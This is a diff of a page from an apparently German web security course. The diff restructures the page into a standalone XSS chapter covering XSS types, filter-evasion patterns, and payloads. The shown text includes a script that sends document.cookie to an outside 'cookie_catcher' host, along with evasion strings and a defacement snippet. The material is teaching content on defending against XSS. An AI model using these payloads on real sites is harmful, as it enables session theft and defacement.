@@ -9,10 +9,10 @@
       
       
       
-        <link rel="prev" href="../../server-side-attacks/SSTI/">
+        <link rel="prev" href="../allgemeines/">
       
       
-        <link rel="next" href="../client_side_hardening/">
+        <link rel="next" href="../csrf-attacks/">
       
       
       <link rel="icon" href="../../assets/images/favicon.png">
@@ -20,7 +20,7 @@
     
     
       
-        <title>Angriffe - Web Application Security</title>
+        <title>Javascript-Injections (XSS) - Web Application Security</title>
       
     
     
@@ -72,7 +72,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#clientseitige-angriffe" class="md-skip">
+        <a href="#javascript-injections-xss" class="md-skip">
           Zum Inhalt
         </a>
       
@@ -108,7 +108,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              Angriffe
+              Javascript-Injections (XSS)
             
           </span>
         </div>
@@ -963,6 +963,28 @@
                 
   
   
+  
+  
+    <li class="md-nav__item">
+      <a href="../allgemeines/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Allgemeines
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
     
   
   
@@ -979,7 +1001,7 @@
           
   
   <span class="md-ellipsis">
-    Angriffe
+    Javascript-Injections (XSS)
     
   </span>
   
@@ -991,7 +1013,7 @@
         
   
   <span class="md-ellipsis">
-    Angriffe
+    Javascript-Injections (XSS)
     
   </span>
   
@@ -1014,16 +1036,6 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#javascript-injections-xss" class="md-nav__link">
-    <span class="md-ellipsis">
-      JavaScript-Injections (XSS)
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="JavaScript-Injections (XSS)">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
   <a href="#arten-von-xss-angriffen" class="md-nav__link">
     <span class="md-ellipsis">
       Arten von XSS-Angriffen
@@ -1031,8 +1043,8 @@
   </a>
   
 </li>
-        
-          <li class="md-nav__item">
+      
+        <li class="md-nav__item">
   <a href="#xss-payloads" class="md-nav__link">
     <span class="md-ellipsis">
       XSS-Payloads
@@ -1091,8 +1103,8 @@
     </nav>
   
 </li>
-        
-          <li class="md-nav__item">
+      
+        <li class="md-nav__item">
   <a href="#dom-based-xss-angriffe" class="md-nav__link">
     <span class="md-ellipsis">
       DOM-based XSS-Angriffe
@@ -1100,8 +1112,8 @@
   </a>
   
 </li>
-        
-          <li class="md-nav__item">
+      
+        <li class="md-nav__item">
   <a href="#upload-von-htmljavascript-dateien" class="md-nav__link">
     <span class="md-ellipsis">
       Upload von HTML/Javascript-Dateien
@@ -1124,8 +1136,8 @@
     </nav>
   
 </li>
-        
-          <li class="md-nav__item">
+      
+        <li class="md-nav__item">
   <a href="#gegenmanahmen" class="md-nav__link">
     <span class="md-ellipsis">
       Gegenmaßnahmen
@@ -1157,8 +1169,8 @@
     </nav>
   
 </li>
-        
-          <li class="md-nav__item">
+      
+        <li class="md-nav__item">
   <a href="#hardening-mittels-x-xss-protection" class="md-nav__link">
     <span class="md-ellipsis">
       Hardening mittels X-XSS-Protection
@@ -1166,109 +1178,11 @@
   </a>
   
 </li>
-        
-          <li class="md-nav__item">
-  <a href="#verwendung-der-content-security-policy" class="md-nav__link">
-    <span class="md-ellipsis">
-      Verwendung der Content-Security-Policy
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
       
         <li class="md-nav__item">
-  <a href="#csrf-angriffe" class="md-nav__link">
+  <a href="#content-security-policy" class="md-nav__link">
     <span class="md-ellipsis">
-      CSRF Angriffe
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="CSRF Angriffe">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#synchronizer-token-pattern" class="md-nav__link">
-    <span class="md-ellipsis">
-      Synchronizer Token Pattern
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#samesite-flag-bei-session-cookies" class="md-nav__link">
-    <span class="md-ellipsis">
-      SameSite-Flag bei Session Cookies
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#unverified-forwards-and-redirects" class="md-nav__link">
-    <span class="md-ellipsis">
-      Unverified Forwards and Redirects
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#clickjacking" class="md-nav__link">
-    <span class="md-ellipsis">
-      Clickjacking
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="Clickjacking">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#x-frame-options" class="md-nav__link">
-    <span class="md-ellipsis">
-      X-Frame-Options
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#reverse-tab-nabbing" class="md-nav__link">
-    <span class="md-ellipsis">
-      Reverse Tab Nabbing
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#html5-postmessage-als-angriffskanal" class="md-nav__link">
-    <span class="md-ellipsis">
-      HTML5 PostMessage als Angriffskanal
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#reflektionsfragen" class="md-nav__link">
-    <span class="md-ellipsis">
-      Reflektionsfragen
+      Content-Security-Policy
     </span>
   </a>
   
@@ -1290,11 +1204,99 @@
   
   
     <li class="md-nav__item">
-      <a href="../client_side_hardening/" class="md-nav__link">
+      <a href="../csrf-attacks/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
-    Härtungsmaßnahmen
+    CSRF-Angriffe
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../unverified-redirects/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Redirects und Forwards
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../clickjacking/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Clickjacking
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../reverse-tab-nabbing/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Reverse Tab-Nabbing
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../postMessage/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    HTML5 postMessage
     
   </span>
   
@@ -1338,7 +1340,7 @@
             
   
   <span class="md-ellipsis">
-    Appendix
+    Client-Seitige Härtung
     
   </span>
   
@@ -1348,6 +1350,142 @@
         
         <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_8_label" aria-expanded="false">
           <label class="md-nav__title" for="__nav_8">
+            <span class="md-nav__icon md-icon"></span>
+            Client-Seitige Härtung
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../client-side-hardening/allgemeines/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Allgemeines
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../client-side-hardening/integration-externer-komponenten/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Integration externer Inhalte
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../client-side-hardening/referer-policy/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Referer-Policy
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../client-side-hardening/content-security-policy/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Content-Security-Policy
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_9" >
+        
+          
+          <label class="md-nav__link" for="__nav_9" id="__nav_9_label" tabindex="">
+            
+  
+  <span class="md-ellipsis">
+    Appendix
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_9_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_9">
             <span class="md-nav__icon md-icon"></span>
             Appendix
           </label>
@@ -1453,16 +1591,6 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#javascript-injections-xss" class="md-nav__link">
-    <span class="md-ellipsis">
-      JavaScript-Injections (XSS)
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="JavaScript-Injections (XSS)">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
   <a href="#arten-von-xss-angriffen" class="md-nav__link">
     <span class="md-ellipsis">
       Arten von XSS-Angriffen
@@ -1470,8 +1598,8 @@
   </a>
   
 </li>
-        
-          <li class="md-nav__item">
+      
+        <li class="md-nav__item">
   <a href="#xss-payloads" class="md-nav__link">
     <span class="md-ellipsis">
       XSS-Payloads
@@ -1530,8 +1658,8 @@
     </nav>
   
 </li>
-        
-          <li class="md-nav__item">
+      
+        <li class="md-nav__item">
   <a href="#dom-based-xss-angriffe" class="md-nav__link">
     <span class="md-ellipsis">
       DOM-based XSS-Angriffe
@@ -1539,8 +1667,8 @@
   </a>
   
 </li>
-        
-          <li class="md-nav__item">
+      
+        <li class="md-nav__item">
   <a href="#upload-von-htmljavascript-dateien" class="md-nav__link">
     <span class="md-ellipsis">
       Upload von HTML/Javascript-Dateien
@@ -1563,8 +1691,8 @@
     </nav>
   
 </li>
-        
-          <li class="md-nav__item">
+      
+        <li class="md-nav__item">
   <a href="#gegenmanahmen" class="md-nav__link">
     <span class="md-ellipsis">
       Gegenmaßnahmen
@@ -1596,8 +1724,8 @@
     </nav>
   
 </li>
-        
-          <li class="md-nav__item">
+      
+        <li class="md-nav__item">
   <a href="#hardening-mittels-x-xss-protection" class="md-nav__link">
     <span class="md-ellipsis">
       Hardening mittels X-XSS-Protection
@@ -1605,109 +1733,11 @@
   </a>
   
 </li>
-        
-          <li class="md-nav__item">
-  <a href="#verwendung-der-content-security-policy" class="md-nav__link">
-    <span class="md-ellipsis">
-      Verwendung der Content-Security-Policy
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
       
         <li class="md-nav__item">
-  <a href="#csrf-angriffe" class="md-nav__link">
+  <a href="#content-security-policy" class="md-nav__link">
     <span class="md-ellipsis">
-      CSRF Angriffe
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="CSRF Angriffe">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#synchronizer-token-pattern" class="md-nav__link">
-    <span class="md-ellipsis">
-      Synchronizer Token Pattern
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#samesite-flag-bei-session-cookies" class="md-nav__link">
-    <span class="md-ellipsis">
-      SameSite-Flag bei Session Cookies
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#unverified-forwards-and-redirects" class="md-nav__link">
-    <span class="md-ellipsis">
-      Unverified Forwards and Redirects
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#clickjacking" class="md-nav__link">
-    <span class="md-ellipsis">
-      Clickjacking
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="Clickjacking">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#x-frame-options" class="md-nav__link">
-    <span class="md-ellipsis">
-      X-Frame-Options
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#reverse-tab-nabbing" class="md-nav__link">
-    <span class="md-ellipsis">
-      Reverse Tab Nabbing
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#html5-postmessage-als-angriffskanal" class="md-nav__link">
-    <span class="md-ellipsis">
-      HTML5 PostMessage als Angriffskanal
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#reflektionsfragen" class="md-nav__link">
-    <span class="md-ellipsis">
-      Reflektionsfragen
+      Content-Security-Policy
     </span>
   </a>
   
@@ -1732,14 +1762,7 @@
   
 
 
-<h1 id="clientseitige-angriffe">Clientseitige Angriffe</h1>
-<p>Client-seitige Angriffe zielen auf den Web-Browser des Benutzers ab. Da
-eine Interaktion des Benutzers bei vielen Angriffen benötigt wird,
-werden sie zumeist im Zuge von Social-Engineering Angriffen eingesetzt.
-Webserver besitzen die Möglichkeit, mittels optionaler HTTP Header den
-Clients Sicherheitspolicies und Verwendungshinweise mitzuteilen; Clients
-können auf diese Weise Schadcode erkennen und filtern.</p>
-<h2 id="javascript-injections-xss">JavaScript-Injections (XSS)</h2>
+<h1 id="javascript-injections-xss">JavaScript-Injections (XSS)</h1>
 <p>Javascript-Injections (Cross-Site Scripting XSS) sind ein sehr häufig
 genutzter Angriffsvektor. Aufgrund der Häufigkeit dieses Angriffsvektor
 sind für diesen auch mehrere Hardening-Maßnahmen verfügbar.</p>
@@ -1753,10 +1776,10 @@ Webseite möglich. Im Normalfall kann hier ein Benutzer Text eingeben,
 z.B. “Hallo”, und dies wird für alle anderen Benutzer als Teil der
 HTML-Seite ausgegeben. Das resultierende HTML-Fragment könnte z.B. so
 aussehen:</p>
-<div class="highlight"><pre><span></span><code>    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;comment&quot;</span><span class="p">&gt;</span>
-        <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;author&quot;</span><span class="p">&gt;</span>Andreas Happe<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
-        <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;content&quot;</span><span class="p">&gt;</span>Hallo<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
-    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;comment&quot;</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;author&quot;</span><span class="p">&gt;</span>Andreas Happe<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;content&quot;</span><span class="p">&gt;</span>Hallo<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
 </code></pre></div>
 <p>Ein Angreifer würde nun versuchen, JavaScript-Code als Eingabe zu
 übergeben, in der Hoffnung, dass dieser Code ungefiltert in der
@@ -1767,10 +1790,10 @@ ausgeführt werden. Ein einfaches Beispiel hierfür wäre die Eingabe von
 relativ harmlos und öffnet nur ein Browser-Popup mit dem Text “1”. Der
 resultierende HTML-Code (der im Browser des Opfers angezeigt werden
 würde) wäre:</p>
-<div class="highlight"><pre><span></span><code>    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;comment&quot;</span><span class="p">&gt;</span>
-        <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;author&quot;</span><span class="p">&gt;</span>Andreas Happe<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
-        <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;content&quot;</span><span class="p">&gt;&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="mf">1</span><span class="p">);&lt;/</span><span class="nt">script</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
-    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;comment&quot;</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;author&quot;</span><span class="p">&gt;</span>Andreas Happe<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;content&quot;</span><span class="p">&gt;&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="mf">1</span><span class="p">);&lt;/</span><span class="nt">script</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
 </code></pre></div>
 <p>Ein Problem bei der defensiven Identifikation von potentiellen
 XSS-Lücken ist, dass die XSS-Angriffsfläche immens ist. Fast jede
@@ -1787,7 +1810,7 @@ Hundert Rechtschreibfehler bemängelt. Wenn nun allerdings in der
 Detailansicht die Rechtschreibfehler betrachtet wurden, wurden
 automatisch XSS-Fragmente aus dem Dokument als Teil der Weboberfläche
 ausgeführt und hatten teilweise Zugriff auf Amazon-Cookies, etc.</p>
-<h3 id="arten-von-xss-angriffen">Arten von XSS-Angriffen</h3>
+<h2 id="arten-von-xss-angriffen">Arten von XSS-Angriffen</h2>
 <p>XSS-Angriffe werden in drei grobe Familien eingeteilt:</p>
 <p>Reflected XSS: hier wird kein XSS-Code am Server persistiert sondern vom Server an
 den Client zurück reflektiert. Dies wird meistens durch das Einschleusen
@@ -1820,25 +1843,25 @@ innerhalb von Webbrowserplugin ab. Da diese auf ein Client-Programm
 abzielen, sind sie für diese Vorlesung out-of-scope.</p>
 <p>Ein Problem an XSS-Angriffsmustern ist, dass diese sehr stark variieren
 können und daher schwer zu filtern sind; anbei mehrere XSS-Muster:</p>
-<div class="highlight"><pre><span></span><code>    <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="mf">1</span><span class="p">);&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">SCRIPT</span> <span class="na">SRC</span><span class="o">=</span><span class="s">http://xss.rocks/xss.js</span><span class="p">&gt;&lt;/</span><span class="nt">SCRIPT</span><span class="p">&gt;</span>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="mf">1</span><span class="p">);&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">SCRIPT</span> <span class="na">SRC</span><span class="o">=</span><span class="s">http://xss.rocks/xss.js</span><span class="p">&gt;&lt;/</span><span class="nt">SCRIPT</span><span class="p">&gt;</span>
 
-    <span class="p">&lt;</span><span class="nt">IMG</span> <span class="na">SRC</span><span class="o">=</span><span class="s">JaVaScRiPt:alert(&#39;XSS&#39;)</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">IMG</span> <span class="na">SRC</span><span class="o">=</span><span class="s">`javascript:alert(&quot;RSnake</span> <span class="na">says</span><span class="err">,</span> <span class="err">&#39;</span><span class="na">XSS</span><span class="err">&#39;&quot;)`</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">IMG</span> <span class="na">SRC</span><span class="o">=</span><span class="s">JaVaScRiPt:alert(&#39;XSS&#39;)</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">IMG</span> <span class="na">SRC</span><span class="o">=</span><span class="s">`javascript:alert(&quot;RSnake</span> <span class="na">says</span><span class="err">,</span> <span class="err">&#39;</span><span class="na">XSS</span><span class="err">&#39;&quot;)`</span><span class="p">&gt;</span>
 
-    <span class="p">&lt;</span><span class="nt">IMG</span> <span class="na">SRC</span><span class="o">=</span><span class="s">javascript:alert(String.fromCharCode(88,83,83))</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">IMG</span> <span class="na">SRC</span><span class="o">=</span><span class="s">javascript:alert(String.fromCharCode(88,83,83))</span><span class="p">&gt;</span>
 
-    <span class="p">&lt;</span><span class="nt">IMG</span> <span class="na">SRC</span><span class="o">=</span> <span class="s">onmouseover=&quot;alert(&#39;xxs&#39;)&quot;</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">IMG</span> <span class="na">SRC</span><span class="o">=</span><span class="s">&quot;jav    ascript:alert(&#39;XSS&#39;);&quot;</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">BGSOUND</span> <span class="na">SRC</span><span class="o">=</span><span class="s">&quot;javascript:alert(&#39;XSS&#39;);&quot;</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">IMG</span> <span class="na">STYLE</span><span class="o">=</span><span class="s">&quot;xss:expr/*XSS*/ession(alert(&#39;XSS&#39;))&quot;</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">IMG</span> <span class="na">SRC</span><span class="o">=</span> <span class="s">onmouseover=&quot;alert(&#39;xxs&#39;)&quot;</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">IMG</span> <span class="na">SRC</span><span class="o">=</span><span class="s">&quot;jav    ascript:alert(&#39;XSS&#39;);&quot;</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">BGSOUND</span> <span class="na">SRC</span><span class="o">=</span><span class="s">&quot;javascript:alert(&#39;XSS&#39;);&quot;</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">IMG</span> <span class="na">STYLE</span><span class="o">=</span><span class="s">&quot;xss:expr/*XSS*/ession(alert(&#39;XSS&#39;))&quot;</span><span class="p">&gt;</span>
 </code></pre></div>
 <p>Eine gute Quelle für weitere XSS-Beispiele ist das <a href="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet">OWASP XSS Filter
 Evasion Cheat Sheet</a>.</p>
-<h3 id="xss-payloads">XSS-Payloads</h3>
+<h2 id="xss-payloads">XSS-Payloads</h2>
 <p>Mittels des eingeschleusten JavaScript-Code versucht der Angreifer nun,
 negativen Einfluss auf einen Benutzer zu nehmen.</p>
-<h4 id="session-hijacking">Session Hijacking</h4>
+<h3 id="session-hijacking">Session Hijacking</h3>
 <p>Javascript wird innerhalb des Browsers ausgeführt. Da in diesem auch
 zumeist das Session-Cookie zur Identifikation eines Benutzers gegneüber
 dem Server gespeichert wird, ist das Stehlen dieses via XSS naheliegend.</p>
@@ -1849,9 +1872,9 @@ Benutzeridentitäten) übermittelt werden sollen. In dem Bespiel wird
 <p>Findet der Angreifer auf der Opferwebseite eine persistent-XSS
 Möglichkeit, könnte er nun folgendes Javascript-Fragement als
 XSS-Payload verwenden:</p>
-<div class="highlight"><pre><span></span><code>    <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
-<span class="w">        </span><span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="o">=</span><span class="s2">&quot;https://offensive.one/cookie_catcher?c=&quot;</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">;</span>
-<span class="w">    </span><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="w">    </span><span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="o">=</span><span class="s2">&quot;https://offensive.one/cookie_catcher?c=&quot;</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">;</span>
+<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
 </code></pre></div>
 <p>Der Webbrowser würde also zu einer neuen URL auf dem Angreifer-Server
 navigiert werden. Ein Teil der URl ist der Parameter ,,c”, dieser
@@ -1862,29 +1885,29 @@ Server mit diesem Cookie mit der Identität des Opfers ausführen können.</p>
 <p>Als Gegenmassnahme für diese Payload sollte insbesondere das
 <em>httpOnly</em>-Flag bei Cookies genannt werden. Durch dieses Flag wird der
 Zugriff via Javascript auf das damit konfigurierte Cookie unterbunden.</p>
-<h4 id="virtual-defacement">Virtual Defacement</h4>
+<h3 id="virtual-defacement">Virtual Defacement</h3>
 <p>Ein weiteres Beispiel wäre <em>Virtual Defacement</em>: bei diesem wird mittels
 JavaScript die dargestellt Webseite verändert und dadurch ein Defacement
 durchgeführt. Bösartig an diesem ist, dass die direkten Inhalte
 (Webseiten im Filesystem des Webservers) weiterhin korrekt aussehen.</p>
 <p>Ein Beispiel wäre folgende Opferwebseite:</p>
-<div class="highlight"><pre><span></span><code>    <span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
-        <span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>..
-            <span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;http://cdn.local/script.js&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
-        <span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
-        <span class="p">&lt;</span><span class="nt">body</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;main&quot;</span><span class="p">&gt;</span>
-            <span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>My Company<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
-        <span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
-    <span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>..
+        <span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;http://cdn.local/script.js&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">body</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;main&quot;</span><span class="p">&gt;</span>
+        <span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>My Company<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
 </code></pre></div>
 <p>In diesem konkrete Beispiel wird Javascript von einem <em>Content Delivery
 Network</em> geladen, liegt also nicht lokal am Opfer-Webserver vor. Ein
 Angreifer würde nun den CDN-Server hacken und das <code>script.js</code>-File ersetzen:</p>
-<div class="highlight"><pre><span></span><code><span class="w">    </span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&quot;main&quot;</span><span class="p">).</span><span class="nx">innerHTML</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;My Company sucks&quot;</span><span class="p">;</span>
+<div class="highlight"><pre><span></span><code><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&quot;main&quot;</span><span class="p">).</span><span class="nx">innerHTML</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;My Company sucks&quot;</span><span class="p">;</span>
 </code></pre></div>
 <p>In diesem Fall wird der Inhalt des Elements ,,main” ersetzt und
 schlußendlich so die Opfer-Webseite defaced.</p>
-<h4 id="social-engineering">Social Engineering</h4>
+<h3 id="social-engineering">Social Engineering</h3>
 <p>XSS kann auch als Teil von Social-Engineering Angriffen verwendet
 werden. Ein Besipiel hierfür wäre das <a href="https://beefproject.com/">BeEF-Framework</a>. Bei diesem wird über Javascript ein
 Client-Handler im Browser installiert. Hierfür könnte z. B. eine
@@ -1893,22 +1916,22 @@ Attacken gestartet werden, unter anderem:</p>
 <ul>
 <li>
 <p>Anzeigen eines Fake <em>Software muss aktualisiert werden</em>-Fenster über
-    dies der Benutzer zum Update eines Browser-Plugins ermuntert wird.
-    Hierbei wird allerdings kein Browserplugin upgedatet, sondern eine
-    vom Angreifer bereitgestelle ausführbare Datei exekutiert.</p>
+  dies der Benutzer zum Update eines Browser-Plugins ermuntert wird.
+  Hierbei wird allerdings kein Browserplugin upgedatet, sondern eine
+  vom Angreifer bereitgestelle ausführbare Datei exekutiert.</p>
 </li>
 <li>
 <p>Anzeigen eines Assistenten, z. B. ,,Clippy”. Auf diese Weise kann
-    ein vorgesehener interaktiver Chat emuliert, und dem Kunden
-    Informationen entlockt werden.</p>
+  ein vorgesehener interaktiver Chat emuliert, und dem Kunden
